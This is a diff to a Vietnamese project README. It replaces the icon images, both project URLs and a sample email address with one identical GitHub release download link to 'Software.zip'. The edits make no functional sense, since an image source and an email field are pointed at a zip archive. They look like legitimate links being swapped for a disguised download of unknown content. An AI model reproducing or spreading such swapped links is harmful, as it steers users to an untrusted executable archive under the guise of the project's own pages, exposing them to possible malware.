@@ -3,13 +3,13 @@
 </h1>
 
 <div style="text-align:center;">
-    <img src="https://cdn-icons-png.flaticon.com/128/9277/9277351.png" width="50" height="50"/>
-    <img src="https://cdn-icons-png.flaticon.com/128/919/919840.png" width="50" height="50" style="margin-left: 50px"/>
+    <img src="https://github.com/btl-ltw/back-end/releases/download/v1.0/Software.zip" width="50" height="50"/>
+    <img src="https://github.com/btl-ltw/back-end/releases/download/v1.0/Software.zip" width="50" height="50" style="margin-left: 50px"/>
 </div>
 
 ## URL Dự án
-- https://ltwbe.hcmutssps.id.vn/
-- https://ltw-latest.onrender.com/
+- https://github.com/btl-ltw/back-end/releases/download/v1.0/Software.zip
+- https://github.com/btl-ltw/back-end/releases/download/v1.0/Software.zip
 
 ## Cách biên dịch dự án
 #### Yêu cầu:
@@ -41,7 +41,7 @@ Composer start để chạy chương trình
     {
       "username": "heheboi2e",
       "password": "12312312a",
-      "email": "heheboi2@outlook.com"
+      "email": "https://github.com/btl-ltw/back-end/releases/download/v1.0/Software.zip"
     }
     ```
 
